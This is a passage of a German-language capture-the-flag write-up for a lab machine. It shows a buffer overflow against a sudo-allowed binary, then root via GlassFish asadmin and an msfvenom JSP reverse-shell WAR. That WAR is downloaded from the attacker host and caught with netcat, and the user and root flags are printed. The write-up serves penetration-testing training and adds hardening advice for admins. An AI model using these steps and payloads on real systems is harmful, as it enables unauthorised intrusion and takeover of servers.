+            <p class="recommendation">**Empfehlung (Pentester):** Den Exploit verfeinern. Da wir den Code nicht debuggen können (keine Leserechte, kein gdb auf Ziel?), müssen wir ggf. raten oder andere Techniken anwenden. Oft gibt es im Programm selbst eine Funktion, die eine Shell öffnet oder die Flag ausgibt, zu der wir springen müssen. Wir könnten versuchen, Adressen leicht zu variieren. Der Exploit im Originaltext scheint einen Nullbyte (`\x00`) zu enthalten, was bei String-basierten Overflows problematisch sein kann. Alternative Übergabemethoden prüfen (z.B. über Python).
+            **Empfehlung (Admin):** Buffer Overflows durch sichere Programmierpraktiken verhindern (Grenzen prüfen, sichere Funktionen wie `strncpy` statt `strcpy` verwenden). Compiler-Flags wie Stack Canaries, ASLR und DEP aktivieren, um Exploits zu erschweren.</p>
+
+            <p class="comment">Wir versuchen, den Exploit-String über Python zu generieren und zu übergeben, um Probleme mit Shell-Interpretation oder Nullbytes zu umgehen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@debian:/$ <span class="command">echo "import sys" >> /dev/shm/neu.py</span></div>
+                    <div class="prompt">www-data@debian:/$ <span class="command">echo 'sys.stdout.write("AAAAAAAAAAAAAAAAAAAAAAAA"+"\x5d\x06\x40\x00");' >> /dev/shm/neu.py</span></div>
+                    <div class="prompt">www-data@debian:/$ <span class="command">sudo -u discover /opt/overflow $(python3 /dev/shm/neu.py)</span></div>
+                    <pre>
+bash: warning: command substitution: ignored null byte in input
+$
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis">**Analyse:** Wir erstellen ein kleines Python-Skript (`neu.py`) in `/dev/shm`, das den Exploit-String direkt auf die Standardausgabe schreibt. Dann versuchen wir, die Ausgabe dieses Skripts als Argument an `/opt/overflow` zu übergeben.
+            Die Bash gibt eine Warnung aus: `ignored null byte in input`. Das bedeutet, dass das Nullbyte (`\x00`) am Ende der Adresse (`\x5d\x06\x40\x00`) von der Bash bei der Kommandosubstitution `$(...)` entfernt wird. Dies verändert unseren Exploit-Payload.
+            Anschließend erhalten wir einen Prompt (`$`) zurück, der darauf hindeutet, dass das Programm `/opt/overflow` erfolgreich ausgeführt wurde und eine Shell gestartet hat! Offenbar war die Adresse (ohne das Nullbyte oder trotz der Warnung) korrekt, um zu einer Funktion zu springen, die eine Shell für uns öffnet.</p>
+            <p class="evaluation">**Bewertung:** Hervorragend! Trotz der Warnung wegen des Nullbytes hat der Buffer Overflow funktioniert. Wir haben erfolgreich eine Shell als Benutzer `discover` erlangt. Die Privilege Escalation von `www-data` zu `discover` war erfolgreich.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Die neue Shell überprüfen (`whoami`, `id`). Die User-Flag (`User.txt`) lesen. Nach weiteren Eskalationsmöglichkeiten suchen, um Root-Rechte zu erlangen.
+            **Empfehlung (Admin):** Buffer Overflow in `/opt/overflow` beheben. `sudo`-Regel überprüfen.</p>
+
+            <p class="comment">Wir sind nun als Benutzer `discover` angemeldet und können die User-Flag lesen (dieser Schritt fehlt im Originaltext zwischen dem Erhalt der Shell und den nächsten Befehlen, wird aber impliziert).</p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">$ <span class="command">whoami</span></div>
+                    <pre>
+discover
+                    </pre>
+                    <div class="prompt">$ <span class="command">cd /home/discover</span></div>
+                    <div class="prompt">discover@debian:/home/discover$ <span class="command">ls</span></div>
+                    <pre>
+User.txt
+                    </pre>
+                    <div class="prompt">discover@debian:/home/discover$ <span class="command">cat User.txt</span></div>
+                    <pre>
+<span class="password">c7d0a8de1e03b25a6f7ed2d91b94dad6</span>
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis">**Analyse:** Wir bestätigen mit `whoami`, dass wir `discover` sind. Wir wechseln in das Home-Verzeichnis und lesen die Datei `User.txt` erfolgreich aus.</p>
+            <p class="evaluation">**Bewertung:** User-Flag erfolgreich erbeutet.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** User-Flag dokumentieren. Nun Fokus auf die Eskalation zu Root.</p>
+
+        </section>
+
+        <section id="proof-of-concept">
+            <h2>Proof of Concept (discover zu root via GlassFish)</h2>
+            <p class="comment">Wir haben jetzt Zugriff als Benutzer `discover`. Unser nächstes Ziel ist es, Root-Rechte zu erlangen. Wir untersuchen erneut die `sudo -l`-Berechtigungen, diesmal für den Benutzer `discover`.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">discover@debian:/$ <span class="command">sudo -l</span></div>
+                    <pre>
+Matching Defaults entries for discover on debian:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User discover may run the following commands on debian:
+    (root) NOPASSWD: /opt/glassfish6/bin/asadmin
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Die Ausgabe von `sudo -l` für den Benutzer `discover` zeigt, dass dieser das GlassFish-Admin-Tool `/opt/glassfish6/bin/asadmin` als `root` ohne Passwortabfrage ausführen darf.</p>
+             <p class="evaluation">**Bewertung:** Dies ist ein weiterer klarer Vektor für Privilege Escalation, diesmal zu `root`. Das `asadmin`-Tool ist mächtig und bietet wahrscheinlich Möglichkeiten, Befehle auszuführen oder Dateien mit Root-Rechten zu manipulieren.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Die Dokumentation oder Hilfe (`sudo -u root /opt/glassfish6/bin/asadmin help`) des `asadmin`-Tools untersuchen, um Befehle zu finden, die zur Codeausführung oder zum Dateizugriff missbraucht werden können. Gängige Techniken beinhalten das Deployen einer bösartigen Anwendung (WAR-Datei) oder das Ändern von Konfigurationen.
+            **Empfehlung (Admin):** Erneut: `sudo`-Rechte extrem sparsam vergeben. Wenn ein Dienst (wie GlassFish) Admin-Zugriff benötigt, diesen über dedizierte Service-Accounts oder sicherere Mechanismen als `sudo` für einen normalen Benutzer ermöglichen. `NOPASSWD` vermeiden.</p>
+
+             <p class="comment">Wir interagieren mit dem `asadmin`-Tool, um seine Funktionsweise zu verstehen und einen Exploit-Pfad zu finden.</p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">discover@debian:/$ <span class="command">sudo /opt/glassfish6/bin/asadmin</span></div>
+                    <pre>
+Use "exit" to exit and "help" for online help.
+asadmin> <span class="command">exit</span>
+                    </pre>
+                    <div class="prompt">discover@debian:/$ <span class="command">sudo /opt/glassfish6/bin/asadmin list-domains</span></div>
+                    <pre>
+domain1 running
+Command list-domains executed successfully.
+                    </pre>
+                    <div class="prompt">discover@debian:/$ <span class="command">sudo /opt/glassfish6/bin/asadmin stop-domain domain1</span></div>
+                    <pre>
+Waiting for the domain to stop ......
+Command stop-domain executed successfully.
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Wir starten `asadmin` interaktiv, sehen die Hilfeoption und beenden es wieder. Mit `list-domains` sehen wir eine laufende Domain `domain1`. Mit `stop-domain` halten wir diese an. Da wir dies als `root` tun (`sudo`), haben wir die Berechtigung dazu.</p>
+             <p class="evaluation">**Bewertung:** Wir bestätigen, dass wir `asadmin` als `root` nutzen können, um den GlassFish-Server zu verwalten. Das Stoppen der Domain ist möglicherweise nicht notwendig, zeigt aber unsere Kontrolle.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Nach Befehlen suchen, die das Deployen von Anwendungen erlauben (z.B. `deploy`) oder Systembefehle ausführen.</p>
+
+             <p class="comment">Ein gängiger Weg, über GlassFish `asadmin` Root-Rechte zu erlangen, ist das Erstellen einer neuen Domain mit einem bekannten Passwort und das anschließende Deployen einer bösartigen WAR-Datei (Web Application Archive), die eine Reverse Shell startet.</p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">discover@debian:/$ <span class="command">sudo /opt/glassfish6/bin/asadmin create-domain domain3</span></div>
+                    <pre>
+There are 1 admin user(s) for administrator tasks:
+  User 1:
+     User name > benni          # (Eingabe durch User)
+Enter the admin password [Enter to accept default of no password]> benni # (Eingabe durch User)
+Enter the admin password again> benni          # (Eingabe durch User)
+[...]
+Domain domain3 created.
+Domain domain3 admin port is 4848.
+Domain domain3 admin user is "benni". # Fehler im Text? Sollte 'benni' sein basierend auf Eingabe
+Command create-domain executed successfully.
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Wir erstellen eine neue GlassFish-Domain namens `domain3`. Während des Prozesses werden wir nach einem Admin-Benutzernamen und Passwort gefragt. Wir wählen `benni` / `benni`. Diese Domain wird standardmäßig auf den Ports 4848 (Admin) und 8080 (HTTP) laufen, was mit der bereits existierenden Domain `domain1` kollidieren könnte (weshalb wir sie vermutlich gestoppt haben).
+            *(Hinweis: Im Originaltext steht am Ende `admin user is "hacker"`, was aber den vorherigen Eingaben widerspricht. Ich gehe von `benni` aus.)*</p>
+             <p class="evaluation">**Bewertung:** Das Erstellen einer neuen Domain als `root` ist ein wichtiger Schritt. Wir kontrollieren nun diese Domain `domain3` mit dem bekannten Admin-Benutzer `benni` und Passwort `benni`.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Die neu erstellte Domain starten (`start-domain domain3`). Den Zugriff auf das Admin-Interface (Port 4848) testen. Eine bösartige WAR-Datei vorbereiten.</p>
+
+            <p class="comment">Wir starten die neu erstellte Domain und versuchen, auf das Admin-Interface zuzugreifen, stoßen aber auf ein Problem mit der sicheren Verwaltung.</p>
+             <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">discover@debian:/$ <span class="command">sudo /opt/glassfish6/bin/asadmin start-domain domain3</span></div>
+                    <pre>
+Waiting for domain3 to start ...................
+Successfully started the domain : domain3
+domain Location: /opt/glassfish6/glassfish/domains/domain3
+Log File: /opt/glassfish6/glassfish/domains/domain3/logs/server.log
+Admin Port: 4848
+Command start-domain executed successfully.
+                    </pre>
+                    <div class="prompt"># <span class="command">Versuchter Zugriff im Browser (Firefox)</span></div>
+                    <pre>
+# Aufruf: http://discover.hmv:4848/
+# Ergebnis: Fehlermeldung "Secure Admin must be enabled to access the DAS remotely."
+                    </pre>
+                    <div class="prompt"># <span class="command">Fehleranalyse im Text</span></div>
+                    <pre>
+# Fehler enstand weil hacker zu kurz war als Passwort, neues PW: hacker123
+# (Hinweis: Diese Analyse im Originaltext ist inkonsistent mit der vorherigen Erstellung mit 'benni'/'benni'. Sie scheint sich auf einen früheren, nicht gezeigten Versuch oder eine falsche Annahme zu beziehen. Wir ignorieren das Passwort 'hacker' hier und konzentrieren uns auf die "Secure Admin"-Meldung.)
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Wir starten `domain3` erfolgreich. Beim Versuch, auf das Admin-Interface (`http://discover.hmv:4848`) zuzugreifen, erhalten wir die Fehlermeldung, dass "Secure Admin" aktiviert sein muss für den Fernzugriff. Das bedeutet, die Administration über das Webinterface ist standardmäßig nur von localhost erlaubt.</p>
+             <p class="evaluation">**Bewertung:** Das ist ein kleiner Stolperstein, aber da wir `asadmin` als `root` ausführen können, können wir Secure Admin einfach aktivieren.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Den `enable-secure-admin`-Befehl von `asadmin` verwenden, um den Fernzugriff zu erlauben. Das zuvor festgelegte Admin-Passwort (`benni`) wird benötigt.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">discover@debian:/$ <span class="command">sudo /opt/glassfish6/bin/asadmin --port 4848 enable-secure-admin</span></div>
+                    <pre>
+Enter admin user name>  benni
+Enter admin password for user "benni"> benni
+Command enable-secure-admin executed successfully.
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Wir führen `enable-secure-admin` aus und authentifizieren uns mit den zuvor festgelegten Zugangsdaten (`benni`/`benni`). Der Befehl wird erfolgreich ausgeführt.</p>
+            <p class="evaluation">**Bewertung:** Der Fernzugriff auf das Admin-Webinterface sollte nun möglich sein (wahrscheinlich über HTTPS).</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Erneut versuchen, auf das Admin-Interface zuzugreifen, diesmal über HTTPS (`https://discover.hmv:4848`). Mit `benni`/`benni` anmelden. Dann die bösartige WAR-Datei deployen.</p>
+
+             <p class="comment">Der Originaltext enthält hier Schritte zum Ändern des Admin-Passworts (`change-admin-password`) auf `hacker123` und einen erneuten Start der Domain. Diese scheinen redundant oder basieren auf der inkonsistenten Fehleranalyse zuvor. Wir gehen davon aus, dass `benni`/`benni` weiterhin gültig ist oder passen uns an, falls der Angreifer hier das Passwort tatsächlich geändert hat. Für den Exploit ist das genaue Passwort wichtig.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">discover@debian:/$ <span class="command">sudo /opt/glassfish6/bin/asadmin change-admin-password --domain_name domain3</span></div>
+                    <pre>
+Enter admin user name [default: admin]> benni
+Enter the current admin password for user "benni"> benni # Aktuelles PW
+Enter the new admin password> hacker123           # Neues PW
+Enter the new admin password again> hacker123      # Neues PW bestätigen
+Command change-admin-password executed successfully.
+                    </pre>
+                      <div class="prompt">discover@debian:/$ <span class="command">sudo /opt/glassfish6/bin/asadmin start-domain domain3</span></div>
+                     <!-- Ausgabe: Domain startet erfolgreich (wie oben) -->
+                     <div class="prompt"># <span class="command">Zugriff im Browser</span></div>
+                     <pre>
+# Aufruf: https://discover.hmv:4848/common/index.jsf
+# Login mit:
+User Name: benni
+Password:  <span class="password">hacker123</span>
+# Ergebnis: Erfolgreicher Login im GlassFish Admin Interface.
+                     </pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Der Pentester ändert hier das Admin-Passwort für den Benutzer `benni` der `domain3` auf `<span class="password">hacker123</span>`. Anschließend wird die Domain neu gestartet (obwohl sie wahrscheinlich noch lief) und der Login im Webinterface unter `https://discover.hmv:4848` mit `benni` und dem neuen Passwort `<span class="password">hacker123</span>` wird erfolgreich durchgeführt.</p>
+             <p class="evaluation">**Bewertung:** Passwortänderung erfolgreich. Der Zugriff auf das Admin-Webinterface als Benutzer `benni` ist nun möglich. Die Inkonsistenz mit dem Namen "hacker" ist nun behoben, der Benutzer ist `benni`, das Passwort `<span class="password">hacker123</span>`.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Nun die bösartige WAR-Datei über das Webinterface deployen.</p>
+
+             <p class="comment">Wir erstellen eine bösartige WAR-Datei mit `msfvenom`, die eine Reverse Shell zu unserer Maschine aufbaut.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt metasploit-prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.2.140 LPORT=5555 -f war > shell.war</span></div>
+                    <pre>
+[-] No platform was selected, choosing Msf::Module::Platform::Java from the payload
+[-] No arch selected, choosing arch: java from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 1103 bytes
+Final size of war file: 1103 bytes
+Saved as: shell.war
+                    </pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Wir verwenden `msfvenom` (Teil des Metasploit Frameworks) auf unserer Angreifer-Maschine, um den Payload zu generieren.
+            *   `-p java/jsp_shell_reverse_tcp`: Wählt den Payload. Dies ist eine Java-basierte Reverse Shell, die über eine JSP-Seite (Java Server Pages) ausgeführt wird.
+            *   `LHOST=192.168.2.140`: Gibt die IP-Adresse unserer Angreifer-Maschine an, zu der sich die Shell verbinden soll.
+            *   `LPORT=5555`: Gibt den Port auf unserer Maschine an, auf dem der Listener laufen wird.
+            *   `-f war`: Gibt das Ausgabeformat an: eine WAR-Datei, die auf Java Application Servern wie GlassFish deployt werden kann.
+            *   `> shell.war`: Leitet die Ausgabe in die Datei `shell.war`.</p>
+            <p class="evaluation">**Bewertung:** Die `shell.war`-Datei ist erfolgreich erstellt und enthält unseren Reverse-Shell-Payload, konfiguriert für unsere IP und den Port 5555.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Die `shell.war`-Datei über den Python-HTTP-Server für das Zielsystem bereitstellen. Einen Netcat-Listener auf Port 5555 starten.
+            **Empfehlung (Admin):** Deployment von WAR-Dateien nur aus vertrauenswürdigen Quellen erlauben. Admin-Interface von GlassFish absichern.</p>
+
+            <p class="comment">Wir stellen die WAR-Datei über den HTTP-Server bereit und laden sie auf das Zielsystem herunter.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">python3 -m http.server 80</span></div>
+                    <pre>
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+192.168.2.112 - - [30/Sep/2022 13:13:39] "GET /shell.war HTTP/1.1" 200 -
+                    </pre>
+                 </div>
+                 <div class="terminal">
+                     <div class="prompt">discover@debian:/dev/shm$ <span class="command">wget http://192.168.2.140/shell.war</span></div>
+                    <pre>
+--2022-09-30 07:13:39--  http://192.168.2.140/shell.war
+Connecting to 192.168.2.140:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1103 (1.1K) [application/octet-stream]
+Saving to: ‘shell.war’
+
+shell.war           100%[===================>]   1.08K  --.-KB/s    in 0s
+
+2022-09-30 07:13:39 (400 MB/s) - ‘shell.war’ saved [1103/1103]
+                    </pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Wir starten den Python-Server auf unserer Maschine (Port 80). Auf der Zielmaschine (in der Shell als `discover`) wechseln wir nach `/dev/shm` und laden die `shell.war` mit `wget` herunter. Der Log des Python-Servers und die Ausgabe von `wget` bestätigen den erfolgreichen Download.</p>
+             <p class="evaluation">**Bewertung:** Die bösartige WAR-Datei befindet sich nun im `/dev/shm`-Verzeichnis auf dem Zielsystem.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Listener auf Port 5555 starten. Die `shell.war` über das GlassFish-Admin-Webinterface (https://discover.hmv:4848) deployen.
+            **Empfehlung (Admin):** Siehe vorherige Empfehlungen zu Dateitransfers und Absicherung des Admin-Interfaces.</p>
+
+             <p class="comment">Wir starten den Listener für die Root-Shell.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 5555</span></div>
+                    <pre>
+listening on [any] 5555 ...
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Wir starten Netcat auf unserer Maschine, um auf die eingehende Verbindung der Root-Reverse-Shell auf Port 5555 zu warten.</p>
+            <p class="evaluation">**Bewertung:** Der Listener ist bereit.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Jetzt die WAR-Datei deployen.</p>
+
+            <p class="comment">Wir deployen die `shell.war`-Datei über das GlassFish-Admin-Webinterface.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt"># <span class="command">Aktion im GlassFish Admin Webinterface (https://discover.hmv:4848)</span></div>
+                    <pre>
+# Navigieren zu: Applications -> Deploy...
+# Optionen auswählen:
+#   Location: Local Packaged File or Directory (...)
+#   File: Durchsuchen... -> /dev/shm/shell.war auswählen
+# Einstellungen belassen (Type: Web Application, Context Root: shell[zufällige_nummer], Server: server (default))
+# OK klicken zum Deployen.
+# Nach erfolgreichem Deployment wird eine URL angezeigt, z.B.:
+# http://debian:8080/shell16999202115420693328/
+# (Das Aufrufen dieser URL löst die Reverse Shell aus)
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Wir nutzen das Webinterface von GlassFish, um die zuvor heruntergeladene `shell.war` aus `/dev/shm` zu deployen. GlassFish erkennt es als Webanwendung und weist ihm einen Kontextpfad (Context Root) zu, unter dem es auf dem HTTP-Port (8080) erreichbar ist. Sobald die Anwendung deployt ist und jemand (oder wir selbst) die entsprechende URL aufruft, wird der JSP-Code in der WAR-Datei ausgeführt und die Reverse Shell zu unserem Listener auf Port 5555 gestartet.</p>
+            <p class="evaluation">**Bewertung:** Das Deployment über das Webinterface ist die Standardmethode und war hier erfolgreich.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Die angezeigte URL aufrufen (oder kurz warten, manchmal startet die Anwendung auch automatisch). Den Netcat-Listener beobachten.
+            **Empfehlung (Admin):** Deployment von Anwendungen nur über sichere, kontrollierte Prozesse erlauben. Admin-Interface stark absichern (Netzwerkzugriff beschränken, starke Passwörter, MFA).</p>
+
+            <p class="comment">Wir rufen die URL der deployten Anwendung auf (oder sie startet automatisch) und fangen die Root-Shell auf unserem Listener ab.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 5555</span></div>
+                    <pre>
+listening on [any] 5555 ...
+connect to [192.168.2.140] from (UNKNOWN) [192.168.2.112] 52678
+id
+uid=0(root) gid=0(root) groups=0(root)
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Unser Netcat-Listener auf Port 5555 meldet eine eingehende Verbindung von der Ziel-IP 192.168.2.112. Wir führen den `id`-Befehl aus und die Ausgabe `uid=0(root) gid=0(root) groups=0(root)` bestätigt, dass die Shell mit Root-Rechten läuft.</p>
+             <p class="evaluation">**Bewertung:** Fantastisch! Die Privilege Escalation war erfolgreich. Wir haben durch das Ausnutzen der `sudo`-Regel für `asadmin` und das Deployen einer bösartigen WAR-Datei vollständige Root-Rechte auf dem Zielsystem erlangt. Das Ziel des Penetrationstests ist erreicht.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Root-Shell stabilisieren (Python pty). Die Root-Flag lesen (`/root/Root.txt`). System nach weiteren Informationen oder Persistenzmöglichkeiten durchsuchen (optional). Ergebnisse dokumentieren.
+            **Empfehlung (Admin):** Sicherheitsvorfall mit höchster Priorität! Kompromittierung untersuchen. `sudo`-Regel für `asadmin` entfernen oder stark einschränken. GlassFish-Installation härten oder entfernen, falls nicht benötigt. System bereinigen oder neu aufsetzen.</p>
+
+             <p class="comment">Wir navigieren im Dateisystem als Root und lesen die User- und Root-Flags.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <!-- Annahme: Shell wurde stabilisiert -->
+                     <div class="prompt">root@debian:/opt/glassfish6/glassfish/domains/domain3/config# <span class="command">pwd</span></div>
+                    <pre>
+/opt/glassfish6/glassfish/domains/domain3/config
+                    </pre>
+                     <div class="prompt">root@debian:/opt/glassfish6/glassfish/domains/domain3/config# <span class="command">cd ~</span></div>
+                     <div class="prompt">root@debian:~# <span class="command">pwd</span></div>
+                    <pre>
+/root
+                    </pre>
+                     <div class="prompt">root@debian:~# <span class="command">ls</span></div>
+                    <pre>
+Root.txt
+                    </pre>
+                     <div class="prompt">root@debian:~# <span class="command">cat Root.txt</span></div>
+                    <pre>
+<span class="password">7140a59e697f44b8a8581cc85df76f4c</span>
+                    </pre>
+                     <div class="prompt">root@debian:~# <span class="command">cd /home/discover</span></div>
+                     <div class="prompt">root@debian:/home/discover# <span class="command">ls</span></div>
+                    <pre>
+User.txt
+                    </pre>
+                     <div class="prompt">root@debian:/home/discover# <span class="command">cat User.txt</span></div>
+                    <pre>
+<span class="password">c7d0a8de1e03b25a6f7ed2d91b94dad6</span>
+                    </pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Als Root wechseln wir ins `/root`-Verzeichnis und lesen die `Root.txt`. Anschließend wechseln wir nach `/home/discover` und lesen die `User.txt` (was vorher als `www-data` nicht möglich war).</p>
+             <p class="evaluation">**Bewertung:** Beide Flags wurden erfolgreich ausgelesen.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Flags dokumentieren. Bericht abschließen.
+            **Empfehlung (Admin):** Die in diesem Bericht aufgezeigten Schwachstellen (RCE in `log.discover.hmv`, unsichere `sudo`-Konfigurationen für `/opt/overflow` und `asadmin`) umgehend beheben.</p>
+
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/discover/User.txt</div>
+                    <div class="flag-value"><span class="password">c7d0a8de1e03b25a6f7ed2d91b94dad6</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/Root.txt</div>
+                    <div class="flag-value"><span class="password">7140a59e697f44b8a8581cc85df76f4c</span></div>
+                </div>
+            </div>
+        </section>
+
+    </div> <!-- Ende container -->
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 30. September 2022</p> <!-- Datum aus wget-Log extrahiert -->
+    </footer>
+</body>
+</html>
